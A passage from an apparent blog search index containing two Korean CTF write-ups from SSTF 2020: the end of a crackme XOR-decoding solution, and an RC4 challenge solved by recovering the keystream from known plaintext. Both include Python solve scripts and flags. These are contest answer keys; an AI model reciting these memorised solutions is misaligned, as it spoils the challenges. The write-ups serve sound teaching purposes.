&#xAC80;&#xC0AC;</li><li>&#xB9DE;&#xC73C;&#xBA74; Correct</li></ol><p>&#xADF8;&#xB7EC;&#xBA74; &#xC800;&#xD76C;&#xAC00; &#xBCF5;&#xD638;&#xD654;&#xD560; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB294;</p><ol><li><p>&#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xB098;&#xC62C; &#xAC12;&#xC740; &#x201C;Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;&#x201D;&#xC774;&#xBBC0;&#xB85C; &#xD574;&#xB2F9; &#xBB38;&#xC790;&#xC5F4;&#xACFC; &#x201C;u7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9&#x201D;&#xB97C; &#xB4A4;&#xC9D1;&#xC740; &#xBB38;&#xC790;&#xC5F4;&#xC744; xor &#xC5F0;&#xC0B0;</p></li><li><p>&#xB098;&#xC628; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xB2E4;&#xC2DC; &#xB4A4;&#xC9D1;&#xC74C;</p></li><li><p>Get Flag!!</p></li></ol><h1 id="Decode-Code"><a href="#Decode-Code" class="headerlink" title="Decode Code"></a>Decode Code</h1><pre><code class="hljs python">key1 = <span class="hljs-string">&quot;u7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9&quot;</span>cmp_key = <span class="hljs-string">&quot;Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;&quot;</span>result1 = <span class="hljs-string">&quot;&quot;</span>revkey = key1[::<span class="hljs-number">-1</span>]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key1)):    result1 += chr(ord(cmp_key[i]) ^ ord(revkey[i]))print(result1[::<span class="hljs-number">-1</span>])</code></pre><p><img src="/2020/10/18/idioth/sstf-crackme101/image2.png" alt></p><p>Flag : SCTF{Y0u_cR4ck3d_M3_up_t4k3_7h15_fL49}</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF RC_four</title>
    <link href="/2020/10/18/idioth/sstf-rc-four/"/>
    <url>/2020/10/18/idioth/sstf-rc-four/</url>
    
    <content type="html"><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p><img src="/2020/10/18/idioth/sstf-rc-four/image.png" alt></p><p>&#xC555;&#xCD95;&#xC744; &#xD480;&#xBA74; challenge.py&#xC640; output.txt &#xD30C;&#xC77C;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/10/18/idioth/sstf-rc-four/image1.png" alt></p><p>output.txt &#xD30C;&#xC77C;&#xC5D0;&#xB294; &#xC554;&#xD638;&#xD654;&#xB41C; &#xAC83;&#xC73C;&#xB85C; &#xCD94;&#xCE21;&#xB418;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xC774; 2&#xC904; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="challenge-py-&#xBD84;&#xC11D;"><a href="#challenge-py-&#xBD84;&#xC11D;" class="headerlink" title="challenge.py &#xBD84;&#xC11D;"></a>challenge.py &#xBD84;&#xC11D;</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> key, flag<span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> hexlify<span class="hljs-comment">#RC4 encrypt function with &quot;key&quot; variable.</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">data</span>):</span><span class="hljs-comment">#check the key is long enough</span><span class="hljs-keyword">assert</span>(len(key) &gt; <span class="hljs-number">128</span>)<span class="hljs-comment">#make RC4 instance</span>cipher = ARC4.new(key)<span class="hljs-comment">#We don&apos;t use the first 1024 bytes from the key stream.</span><span class="hljs-comment">#Actually this is not important for this challenge. Just ignore.</span>cipher.encrypt(<span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-number">1024</span>)<span class="hljs-comment">#encrypt given data, and return it.</span><span class="hljs-keyword">return</span> cipher.encrypt(data)msg = <span class="hljs-string">&quot;RC4 is a Stream Cipher, which is very simple and fast.&quot;</span><span class="hljs-keyword">print</span> (hexlify(encrypt(msg)).decode())<span class="hljs-keyword">print</span> (hexlify(encrypt(flag)).decode())</code></pre><p>challenge &#xD30C;&#xC77C;&#xC744; &#xD574;&#xBCF4;&#xBA74; arc4&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC554;&#xD638;&#xD654;&#xB97C; &#xC9C4;&#xD589;&#xD55C; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>output.txt&#xC758; &#xCCAB; &#xBC88;&#xC9F8; &#xC904;&#xC740; msg&#xB97C; &#xC554;&#xD638;&#xD654;&#xD55C; &#xBD80;&#xBD84;&#xC774;&#xACE0; &#xB450; &#xBC88;&#xC9F8; &#xC904;&#xC740; flag&#xC784;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://en.wikipedia.org/wiki/RC4">rc4 &#xC54C;&#xACE0;&#xB9AC;&#xC998;</a>&#xC740; &#xC2A4;&#xD2B8;&#xB9BC; &#xC554;&#xD638;&#xB85C; key &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC154;&#xD50C;&#xB9C1;&#xC744; &#xD1B5;&#xD574; &#xD0A4; &#xC2A4;&#xD2B8;&#xB9BC; &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD55C; &#xD6C4; &#xD574;&#xB2F9; &#xD0A4; &#xC2A4;&#xD2B8;&#xB9BC;&#xACFC; xor &#xC5F0;&#xC0B0;&#xC744; &#xD1B5;&#xD574; &#xC554;&#xD638;&#xD654;&#xB97C; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p>key &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC0DD;&#xC131;&#xB41C; key stream&#xACFC; &#xBB38;&#xC790;&#xC5F4;&#xC744; xor &#xC5F0;&#xC0B0;&#xD558;&#xC5EC; &#xCD5C;&#xC885; &#xC554;&#xD638;&#xBB38;&#xC774; &#xB098;&#xC624;&#xB294; &#xAC83;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xBA74; key &#xAC12;&#xC744; &#xC54C;&#xC9C0; &#xBABB;&#xD574;&#xB3C4; flag &#xC554;&#xD638;&#xBB38;&#xC744; &#xBCF5;&#xD638;&#xD654;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>key stream ^ &#xBB38;&#xC790;&#xC5F4; = &#xC554;&#xD638;&#xBB38;&#xC774;&#xBBC0;&#xB85C; &#xC554;&#xD638;&#xBB38; ^ &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC218;&#xD589;&#xD558;&#xBA74; key stream&#xC744; &#xC54C; &#xC218; &#xC788;&#xACE0; &#xD574;&#xB2F9; key stream&#xACFC; flag &#xC554;&#xD638;&#xBB38;&#xC744; xor &#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD558;&#xBA74; flag &#xAC12;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Decrypt-Code"><a href="#Decrypt-Code" class="headerlink" title="Decrypt Code"></a>Decrypt Code</h1><pre><code class="hljs python">text = <span class="hljs-string">&quot;RC4 is a Stream Cipher, which is very simple and fast.&quot;</span>result = [<span class="hljs-number">0x63</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xf8</span>]stream = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(text))]dec_flag = [<span class="hljs-number">0x62</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xcb</span>]flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(text)):    stream[i] = str(int(ord(text[i]) ^ result[i]))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(dec_flag)):    flag += str(chr(int(stream[i]) ^ dec_flag[i]))print(flag)</code></pre><p><img src="/2020/10/18/idioth/sstf-rc-four/image2.png" alt></p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>idioth</tag>
      
      <tag>crypto</tag>
      
      <tag>rc4</tag>
      
      <tag>decrypt</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
